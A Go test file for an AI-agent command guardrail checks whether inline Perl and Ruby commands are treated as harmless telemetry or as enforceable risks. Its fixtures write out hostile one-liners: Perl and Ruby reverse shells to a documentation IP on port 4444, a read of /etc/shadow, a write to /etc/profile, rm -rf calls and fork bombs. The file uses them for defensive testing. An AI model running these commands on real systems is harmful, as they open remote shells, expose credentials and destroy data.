// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"database/sql"
	"encoding/json"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/audit"
	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/scanner"
)

func TestPerlRubyInlineOwnersAreQuietAcrossProfilesModesAndPersistence(t *testing.T) {
	resetConnectorRuleCategories(t)
	for _, profile := range []string{"default", "strict", "permissive"} {
		for _, mode := range []string{"observe", "action"} {
			t.Run(profile+"/"+mode, func(t *testing.T) {
				const connector = "codex"
				installIssue708ProfileConnector(t, connector, profile)
				fixture := newSidecarRuntimeFixture(t, true)
				logger := audit.NewLogger(fixture.store)
				logger.SetRuntimeV8Emitter(&sidecarOwnedObservabilityV8Runtime{runtime: fixture.runtime})
				cfg := &config.Config{}
				cfg.Guardrail.Mode = mode
				cfg.Guardrail.Connector = connector
				cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), profile)
				api := NewAPIServer(
					"127.0.0.1:0", NewSidecarHealth(), nil, fixture.store, logger, cfg,
				)
				for _, test := range []struct {
					command string
					ruleID  string
				}{
					{command: `perl -e 'print 1'`, ruleID: "CMD-PERL-E"},
					{command: `ruby -e 'puts 1'`, ruleID: "CMD-RUBY-E"},
				} {
					response := api.evaluateCodexHook(t.Context(), codexHookRequest{
						HookEventName: "PreToolUse", ToolName: "Bash",
						ToolInput: map[string]interface{}{"command": test.command}, CWD: "/repo",
					})
					if response.Action != guardrailActionAllow ||
						response.RawAction != guardrailActionAllow || response.Severity != "LOW" ||
						response.WouldBlock || response.AdditionalContext != "" ||
						!findingStringHasRuleID(response.Findings, test.ruleID) {
						t.Fatalf("%s/%s response for %q = %+v, want quiet LOW telemetry", profile, mode, test.command, response)
					}
				}

				database, err := sql.Open("sqlite", fixture.path)
				if err != nil {
					t.Fatal(err)
				}
				defer database.Close()
				rows, err := database.Query(
					`SELECT rule_id, tags FROM scan_findings WHERE rule_id IN ('CMD-PERL-E', 'CMD-RUBY-E')`,
				)
				if err != nil {
					t.Fatal(err)
				}
				count := 0
				for rows.Next() {
					var ruleID, rawTags string
					if err := rows.Scan(&ruleID, &rawTags); err != nil {
						t.Fatal(err)
					}
					var tags []string
					if err := json.Unmarshal([]byte(rawTags), &tags); err != nil {
						t.Fatal(err)
					}
					if !hasStableFindingTag(tags, scanner.FindingTagDetectionOnly) ||
						hasStableFindingTag(tags, trustedParserUncertaintyTag) {
						t.Fatalf("persisted %s tags = %v, want proven detection-only", ruleID, tags)
					}
					count++
				}
				if err := rows.Close(); err != nil {
					t.Fatal(err)
				}
				if err := rows.Err(); err != nil {
					t.Fatal(err)
				}
				if count != 2 {
					t.Fatalf("persisted Perl/Ruby findings = %d, want 2", count)
				}
				alerts, err := fixture.store.ListAlerts(20)
				if err != nil {
					t.Fatal(err)
				}
				if len(alerts) != 0 {
					t.Fatalf("detection-only Perl/Ruby telemetry entered Alerts: %+v", alerts)
				}
			})
		}
	}
}

func TestPerlRubyInlineEffectFreeOwnersAreDetectionOnly(t *testing.T) {
	resetConnectorRuleCategories(t)
	const connector = "issue-708-perl-ruby-benign"
	installIssue708ProfileConnector(t, connector, "default")
	for _, test := range []struct {
		name    string
		command string
		ruleID  string
	}{
		{name: "Perl print", command: `perl -e 'print 1'`, ruleID: "CMD-PERL-E"},
		{name: "Ruby puts", command: `ruby -e 'puts 1'`, ruleID: "CMD-RUBY-E"},
		{name: "Ruby static collection", command: `ruby -e 'items = ["a", "b"]; puts items.join("-")'`, ruleID: "CMD-RUBY-E"},
	} {
		t.Run(test.name, func(t *testing.T) {
			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
				Input:      actionfacts.Input{Tool: "shell", Command: test.command, CWD: "/repo"},
				LegacyText: test.command, Connector: connector, EnforcementCapable: true,
			})
			matched := findingWithID(findings, test.ruleID)
			if matched == nil || matched.contributesToEnforcement() || matched.Severity != "LOW" {
				t.Fatalf("effect-free %s finding = %+v, want retained LOW detection-only", test.ruleID, matched)
			}
		})
	}
}

func TestPerlRubyInlineEffectfulOrUncertainOwnersRemainEnforceable(t *testing.T) {
	resetConnectorRuleCategories(t)
	const connector = "issue-708-perl-ruby-controls"
	installIssue708ProfileConnector(t, connector, "default")
	for _, test := range []struct {
		name             string
		command          string
		ruleID           string
		wantNetwork      bool
		wantShellExec    bool
		wantNonAuthority bool
	}{
		{name: "Perl read", command: `perl -e 'open(my $fh, "<", "/etc/shadow")'`, ruleID: "CMD-PERL-E"},
		{name: "Ruby write", command: `ruby -e 'File.write("/etc/profile", "x")'`, ruleID: "CMD-RUBY-E"},
		{name: "Perl child", command: `perl -e 'system("/bin/rm", "-rf", "/tmp/x")'`, ruleID: "CMD-PERL-E"},
		{name: "Ruby child", command: `ruby -e 'system("rm -rf /tmp/x")'`, ruleID: "CMD-RUBY-E"},
		{name: "Perl fork bomb", command: `perl -e 'fork while fork'`, ruleID: "CMD-PERL-E"},
		{name: "Ruby fork bomb", command: `ruby -e 'loop { fork }'`, ruleID: "CMD-RUBY-E"},
		{name: "Perl unknown", command: `perl -e 'Example::Unknown::call("x")'`, ruleID: "CMD-PERL-E"},
		{name: "Ruby dynamic", command: `ruby -e 'eval("puts 1")'`, ruleID: "CMD-RUBY-E"},
		{
			name: "Perl outbound network", ruleID: "CMD-PERL-E",
			command:     `perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(PeerAddr => "203.0.113.10", PeerPort => 4444, Proto => "tcp")'`,
			wantNetwork: true, wantNonAuthority: true,
		},
		{
			name: "Ruby outbound network", ruleID: "CMD-RUBY-E",
			command:     `ruby -e 'require "socket"; s = TCPSocket.new("203.0.113.10", 4444)'`,
			wantNetwork: true, wantNonAuthority: true,
		},
		{
			name: "Perl reverse shell", ruleID: "CMD-PERL-E",
			command:     `perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(PeerAddr => "203.0.113.10", PeerPort => 4444, Proto => "tcp"); open(STDIN, "<&", $s); open(STDOUT, ">&", $s); exec("/bin/sh", "-i")'`,
			wantNetwork: true, wantShellExec: true, wantNonAuthority: true,
		},
		{
			name: "Ruby reverse shell", ruleID: "CMD-RUBY-E",
			command:     `ruby -e 'require "socket"; s = TCPSocket.new("203.0.113.10", 4444); STDIN.reopen(s); STDOUT.reopen(s); exec("/bin/sh", "-i")'`,
			wantNetwork: true, wantShellExec: true, wantNonAuthority: true,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			if test.wantNonAuthority && (facts.Authoritative() || facts.EnforcementEligible()) {
				t.Fatalf("unsafe parser result is authoritative: %+v", facts)
			}
			if test.wantNetwork && len(facts.Network) == 0 {
				t.Fatalf("network projection is missing: %+v", facts)
			}
			if test.wantShellExec {
				proven := false
				for _, command := range facts.Commands {
					if actionfacts.ProvesPOSIXInlineInterpreterShellExec(facts, command.ID) {
						proven = true
						break
					}
				}
				if !proven {
					t.Fatalf("reverse-shell execution projection is missing: %+v", facts)
				}
			}
			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
				Input:      actionfacts.Input{Tool: "shell", Command: test.command, CWD: "/repo"},
				LegacyText: test.command, Connector: connector, EnforcementCapable: true,
			})
			matched := findingWithID(findings, test.ruleID)
			if matched == nil || !matched.contributesToEnforcement() {
				t.Fatalf("unsafe %s finding = %+v, want conservative enforcement: %+v", test.ruleID, matched, findings)
			}
		})
	}
}

func TestPerlRubyInlineRuleIdentityIsExactAndUnique(t *testing.T) {
	for _, ruleID := range []string{"CMD-PERL-E", "CMD-RUBY-E"} {
		t.Run(ruleID, func(t *testing.T) {
			contract, ok := trustedLegacyProvenCommandDetectionOnly[ruleID]
			if !ok {
				t.Fatalf("%s detection-only contract is missing", ruleID)
			}
			rule := PatternRule{
				ID: ruleID, Pattern: regexp.MustCompile(contract.pattern),
				Title: contract.title, Severity: contract.severity,
				Confidence: contract.confidence, Tags: append([]string(nil), contract.tags...),
			}
			exact := &compiledRulePackCategories{categories: []ruleCategory{
				{Name: "command", Rules: []PatternRule{rule}},
			}}
			if !trustedLegacyDetectionOnlyCommandRule(exact, ruleID, contract) {
				t.Fatal("exact built-in identity was not accepted")
			}
			clone := func() PatternRule {
				return PatternRule{
					ID: ruleID, Pattern: regexp.MustCompile(contract.pattern),
					Title: contract.title, Severity: contract.severity,
					Confidence: contract.confidence, Tags: append([]string(nil), contract.tags...),
				}
			}
			for _, mutation := range []struct {
				name       string
				categories []ruleCategory
			}{
				{name: "wrong category", categories: []ruleCategory{{Name: "custom", Rules: []PatternRule{rule}}}},
				{name: "duplicate", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{rule}}, {Name: "custom", Rules: []PatternRule{rule}}}},
				{name: "case alias", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{rule}}, {Name: "custom", Rules: []PatternRule{{ID: strings.ToLower(ruleID), Pattern: regexp.MustCompile(`x`)}}}}},
				{name: "space alias", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{rule}}, {Name: "custom", Rules: []PatternRule{{ID: " " + ruleID + " ", Pattern: regexp.MustCompile(`x`)}}}}},
				{name: "missing", categories: []ruleCategory{{Name: "command"}}},
				{name: "nil pattern", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Pattern = nil; return r }()}}}},
				{name: "wrong pattern", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Pattern = regexp.MustCompile(contract.pattern + `(?:)`); return r }()}}}},
				{name: "expression", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Expression = "true"; return r }()}}}},
				{name: "tool only", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.ToolCallOnly = true; return r }()}}}},
				{name: "title", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Title += " custom"; return r }()}}}},
				{name: "severity", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Severity = "CRITICAL"; return r }()}}}},
				{name: "confidence", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Confidence = 0.56; return r }()}}}},
				{name: "tags", categories: []ruleCategory{{Name: "command", Rules: []PatternRule{func() PatternRule { r := clone(); r.Tags = []string{"custom"}; return r }()}}}},
			} {
				t.Run(mutation.name, func(t *testing.T) {
					generation := &compiledRulePackCategories{categories: mutation.categories}
					if trustedLegacyDetectionOnlyCommandRule(generation, ruleID, contract) {
						t.Fatal("mutated/colliding identity entered detection-only lane")
					}
				})
			}
		})
	}
}

func TestPerlRubyInlineMixedOwnersAreAllOrNothingAndIndependent(t *testing.T) {
	for _, test := range []struct {
		name          string
		command       string
		wantPerlProof bool
		wantRubyProof bool
	}{
		{
			name:          "safe and unsafe Perl owners",
			command:       `perl -e 'print 1'; perl -e 'open(my $fh, "<", "/etc/shadow")'`,
			wantPerlProof: false,
		},
		{
			name:          "safe Perl and unsafe Ruby remain independent",
			command:       `perl -e 'print 1'; ruby -e 'File.write("/etc/profile", "x")'`,
			wantPerlProof: true, wantRubyProof: false,
		},
		{
			name:          "unowned matching command prevents Perl demotion",
			command:       `perl -e 'print 1'; foo-perl -e dangerous`,
			wantPerlProof: false,
		},
		{
			name:          "literal carrier match prevents Perl demotion",
			command:       `perl -e 'print 1'; printf '%s' 'perl -e dangerous'`,
			wantPerlProof: false,
		},
		{
			name:          "normalized non-owner match prevents Perl demotion",
			command:       `perl -e 'print 1'; launcher 'foo-per\l -e dangerous '`,
			wantPerlProof: false,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "shell", Command: test.command, CWD: "/repo"})
			if got := trustedPerlInlineEffectFreeOwnerProven(facts); got != test.wantPerlProof {
				t.Fatalf("Perl effect-free proof = %t, want %t: %+v", got, test.wantPerlProof, facts)
			}
			if got := trustedRubyInlineEffectFreeOwnerProven(facts); got != test.wantRubyProof {
				t.Fatalf("Ruby effect-free proof = %t, want %t: %+v", got, test.wantRubyProof, facts)
			}
		})
	}
}

func TestPerlRubyInlineMalformedAncestryFailsClosedWithoutHanging(t *testing.T) {
	facts := actionfacts.Analyze(actionfacts.Input{
		Tool: "shell", Command: `perl -e 'print 1'; true`, CWD: "/repo",
	})
	if !facts.Authoritative() || !facts.EnforcementEligible() {
		t.Fatalf("control facts are not authoritative: %+v", facts)
	}
	mutated := false
	for index := range facts.Commands {
		if facts.Commands[index].Program == "true" {
			facts.Commands[index].ParentCommandID = facts.Commands[index].ID
			mutated = true
			break
		}
	}
	if !mutated {
		t.Fatalf("control command is missing: %+v", facts.Commands)
	}

	result := make(chan bool, 1)
	go func() {
		result <- trustedPerlInlineEffectFreeOwnerProven(facts)
	}()
	select {
	case proven := <-result:
		if proven {
			t.Fatal("cyclic command ancestry entered the detection-only lane")
		}
	case <-time.After(time.Second):
		t.Fatal("cyclic command ancestry did not terminate")
	}
}
